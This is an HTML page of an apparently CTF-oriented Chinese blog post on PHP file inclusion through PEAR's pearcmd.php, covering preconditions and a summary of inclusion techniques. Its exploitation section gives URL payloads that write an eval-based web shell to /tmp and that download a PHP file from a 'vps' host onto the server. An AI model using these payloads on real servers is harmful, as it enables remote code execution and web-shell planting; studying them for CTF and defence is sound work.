@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="ref p牛nb! y4tacker对pearcmd的分析 pearcmd的利用 !!!pearcmd的利用补充，有对payload的思考 pearcmd的其他补充  pearcmd法 什么是pearcmd? PEAR（PHP Extension and Application Repository）: 是一个用于PHP的框架和分发系统，它提供了一个库的集合(侧重提供php编写的拓展) –&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php恶意文件包含">
+<meta property="og:url" content="https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="ref p牛nb! y4tacker对pearcmd的分析 pearcmd的利用 !!!pearcmd的利用补充，有对payload的思考 pearcmd的其他补充  pearcmd法 什么是pearcmd? PEAR（PHP Extension and Application Repository）: 是一个用于PHP的框架和分发系统，它提供了一个库的集合(侧重提供php编写的拓展) –&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png">
+<meta property="article:published_time" content="2025-02-26T11:38:34.827Z">
+<meta property="article:modified_time" content="2025-02-26T14:12:10.330Z">
+<meta property="article:tag" content="PHP安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>php恶意文件包含</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/25/AliyunCTF25/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&text=php恶意文件包含"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&is_video=false&description=php恶意文件包含"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php恶意文件包含&body=Check out this article: https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&name=php恶意文件包含&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&t=php恶意文件包含"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ref"><span class="toc-number">1.</span> <span class="toc-text">ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pearcmd%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">pearcmd法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">*恶意文件包含总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php恶意文件包含
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-26T11:38:34.827Z" class="dt-published" itemprop="datePublished">2025-02-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/PHP%E5%AE%89%E5%85%A8/" rel="tag">PHP安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/">p牛nb!</a></li>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%2f">y4tacker对pearcmd的分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://shad0wwalker.com/posts/2151591161.html">pearcmd的利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://yuy0ung.github.io/2024/03/27/pearcmd/">!!!pearcmd的利用补充，有对payload的思考</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrs_H/article/details/122386511">pearcmd的其他补充</a></li>
+</ol>
+<h2 id="pearcmd法"><a href="#pearcmd法" class="headerlink" title="pearcmd法"></a>pearcmd法</h2><ol>
+<li><em><strong>什么是pearcmd?</strong></em><ol>
+<li>PEAR（PHP Extension and Application Repository）: 是一个用于PHP的框架和分发系统，它提供了一个库的集合(侧重提供php编写的拓展) –&gt; PEAR不仅包括了PHP代码库，还提供了命令行工具来简化库的安装和维护</li>
+<li>PECL（PHP Extension Community Library）:放 PHP 扩展库的仓库(侧重于提供用 C 编写的扩展)<ol>
+<li>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库</li>
+</ol>
+</li>
+<li>pear&#x2F;pcel是一个命令行工具，可以在命令行中使用</li>
+<li>pearcmd.php: 是 PEAR（PHP Extension and Application Repository）命令行工具的一部分，它允许用户通过命令行与 PEAR 系统进行交互。使用 pearcmd.php 可以执行诸如安装、升级和管理 PHP 包等操作<ol>
+<li>直接使用 pear 命令更常见，它实际上是一个指向 pearcmd.php 脚本的包装器</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><em><strong>利用版本前提</strong></em><ol>
+<li>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</li>
+<li>在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</li>
+<li>php.ini当中, 要开启register_argc_argv这个选项（在Docker中自动开启）<ol>
+<li>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</li>
+</ol>
+</li>
+<li>要有文件包含的利用</li>
+<li>确定pearcmd.php的位置(通常为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php)</li>
+</ol>
+</li>
+<li><em><strong>本质思想</strong></em><ol>
+<li>我们可以通过web的参数来控制pear命令行的功能和参数</li>
+</ol>
+</li>
+<li><em><strong>注意点</strong></em><ol>
+<li>&amp;符无发分割参数，真正能分割参数的是加号</li>
+<li>等号无法赋值，而是会直接被传进去当作参数。</li>
+</ol>
+</li>
+<li><em><strong>利用</strong></em><ol>
+<li><p>利用<code>config-create</code>命令: 第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
+<ul>
+<li><p><input disabled="" type="checkbox"> 
+这里为什么要使用&#x2F;呢？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config-create: Create a Default configuration file, must have 2 parameters, root path and filename to save as</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式一: 文件包含的点是?file=</span></span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>+/tmp/kc1zs4.php</span><br><span class="line"><span class="comment">// 格式二: 文件包含的点是?file=</span></span><br><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="keyword">die</span>()<span class="meta">?&gt;</span>+/tmp/kc1zs4.php</span><br><span class="line">    <span class="comment">// 可能会在输出的时候重复输出很多次，可以多加一个die</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><code>install</code></p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install: Install Package, pear install http://xxxx/test.php就可以下载php文件，还可以用--installroot指定目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1: 使用+号做分割</span></span><br><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://vps/kc1zs4.php</span><br><span class="line">    <span class="comment"># 这个payload会将文件下载到网站目录的 &amp;file=/usr/local/lib/php/pearcmd.php\&amp;/tmp/pear/download/ 文件夹下，构造非常巧妙，访问时需要url编码，可以直接访问到文</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2: 没有根目录写权限，可以将文件下载到/tmp/pear/download</span></span><br><span class="line">?+install+http://localhost/index.html+&amp;file=/usr/local/lib/php/pearcmd.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload3: 没有根目录写权限，将文件下载到/tmp/testinstall/tmp/pear/download下</span></span><br><span class="line">?+install+--installroot+/tmp/testinstall+http://localhost/index.html+&amp;file=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>download</code></p>
+<ol>
+<li>原命令是pear download url，和之前的install一样</li>
+<li>可以将文件写到当前网站目录下</li>
+</ol>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download: Download Package</span></span><br><span class="line">?+download+http://vps/kc1zs4.php&amp;file=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可能有其他命令，需要看: <img src="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="pearcmd.php参数"></p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="恶意文件包含总结"><a href="#恶意文件包含总结" class="headerlink" title="*恶意文件包含总结"></a>*恶意文件包含总结</h2><ol>
+<li>恶意文件包含的本质就是寻找一个可控的文件进行包含，之后可以传入参数</li>
+<li>两个基本问题<ol>
+<li>如何控制文件内容</li>
+<li>如何获取文件路径</li>
+<li>文件可以保持一段时间</li>
+</ol>
+</li>
+<li>小小总结<ol>
+<li>session: 内容可控，session文件名可控</li>
+<li>php文件处理机制: 内容可控<ol>
+<li>windows下通配符: 统配获取文件名</li>
+<li>phpinfo: phpinfo中有临时文件名</li>
+<li>条件竞争</li>
+<li>文件残余: crash掉php进程(apache和fpm会新开离另一个进程)，<strong>查看残余文件</strong></li>
+</ol>
+</li>
+<li>pearcmde法: <strong>可能可以通过依赖管理的漏洞来引入文件，前提要接触到那个漏洞</strong></li>
+<li>其他可能的思路，比如php伪协议(data:&#x2F;&#x2F;)</li>
+</ol>
+</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ref"><span class="toc-number">1.</span> <span class="toc-text">ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pearcmd%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">pearcmd法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">*恶意文件包含总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&text=php恶意文件包含"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&is_video=false&description=php恶意文件包含"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php恶意文件包含&body=Check out this article: https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&title=php恶意文件包含"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&name=php恶意文件包含&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/02/26/php%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/&t=php恶意文件包含"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
